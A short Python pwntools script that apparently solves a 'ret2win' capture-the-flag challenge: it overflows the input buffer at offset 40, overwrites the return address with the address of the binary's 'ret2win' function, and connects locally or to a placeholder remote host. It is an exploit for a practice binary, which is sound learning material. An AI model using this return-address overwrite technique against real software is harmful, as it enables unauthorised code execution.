#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 40
    payload = flat({offset: [
            exe.symbols['ret2win']
        ]})
    r.sendlineafter(b'>', payload)
    r.interactive()


if __name__ == "__main__":
    main()

